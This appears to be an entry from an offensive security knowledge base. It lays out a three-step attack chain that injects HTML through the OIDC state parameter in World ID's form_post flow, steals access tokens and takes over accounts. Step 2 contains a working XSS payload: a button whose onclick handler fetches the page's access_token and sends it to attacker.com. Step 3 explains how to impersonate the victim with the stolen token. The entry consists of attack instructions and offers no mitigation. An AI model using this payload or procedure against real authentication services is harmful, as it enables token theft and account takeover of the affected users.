---
id: uuid-attack-chain-1
tags:
  - xss
  - oidc
  - authentication
  - token-theft
  - ato
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-State-Parameter-Injection-in-OIDC]]'
  - '[[procedures/Inject-Malicious-HTML-into-State-Parameter]]'
  - '[[procedures/Exfiltrate-Access-Token-via-Injected-Element]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:24.619Z'
description: >-
  Multi-stage attack exploiting insufficient filtering of the state parameter in
  World ID OIDC authentication to inject HTML, steal access tokens, and achieve
  account takeover.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# XSS-via-State-Parameter-Injection-in-World-ID-OIDC-Leading-to-Access-Token-Theft-and-ATO

Multi-stage attack chain demonstrating exploitation of insufficient state parameter filtering in World ID OIDC form_post response mode to inject HTML, capture access tokens, and enable account takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Vulnerability] --> B[Inject Malicious HTML]
    B --> C[Exfiltrate Token and ATO]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for parameter manipulation
- Attacker-controlled server (e.g., for receiving exfiltrated data)

### Target Environment

- Web platform with World ID OIDC authentication using form_post response mode
- No specific ports; requires access to the authentication endpoint

### Initial Access Requirements

- Ability to initiate OIDC authentication flow as a user
- Network access to the target authentication service
- No prior credentials needed beyond starting the auth process

## Detailed Attack Procedures

### Step 1: Identify Vulnerability
procedure: [[procedures/Identify-State-Parameter-Injection-in-OIDC]]

**Objective**: Detect lack of validation in the state parameter allowing HTML injection into the OIDC response body.

**Instructions**: Initiate the OIDC authentication flow and inspect the state parameter in the authorization request. Test by appending HTML characters (e.g., `<script>alert(1)</script>`) to the state value and observe if they appear unsanitized in the form_post response body.

**Expected Output**: HTML characters rendered in the response form without escaping, confirming injection point.

**Success Indicators**:
- Injected HTML appears in the browser's response body
- No sanitization errors or blocks observed

### Step 2: Inject Malicious HTML
procedure: [[procedures/Inject-Malicious-HTML-into-State-Parameter]]

**Objective**: Craft and inject interactive HTML elements into the state parameter to create a malicious button in the response form.

**Instructions**: Modify the state parameter in the OIDC authorization URL to include a payload like `state=<button onclick="fetch('https://attacker.com/steal?token='+document.querySelector('[name=access_token]').value)">Click Me</button>`. Submit the modified request and complete the auth flow to render the injected element.

**Expected Output**: Malicious button appears in the authentication response form alongside legitimate elements.

**Success Indicators**:
- Injected button renders and is clickable in the form
- CSP does not block the inline script or fetch

### Step 3: Exfiltrate Token and Achieve ATO
procedure: [[procedures/Exfiltrate-Access-Token-via-Injected-Element]]

**Objective**: Use the injected element to capture and send the access token to an attacker-controlled endpoint, enabling account takeover.

**Instructions**: With the malicious button rendered, simulate user interaction by clicking it. The onclick handler extracts the access token from the form and sends it via fetch to the attacker's server. Use the received token to impersonate the user and access their account.

**Expected Output**: Access token received on attacker's server; successful API calls using the token confirm ATO.

**Success Indicators**:
- Token exfiltrated to attacker endpoint
- Account actions (e.g., profile access) performed with stolen token

## Attack Chain Summary

### Key Achievements

1. Identified and exploited state parameter injection for HTML rendering
2. Injected interactive element to steal access tokens with user click
3. Demonstrated account takeover via token misuse, despite partial CSP mitigation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
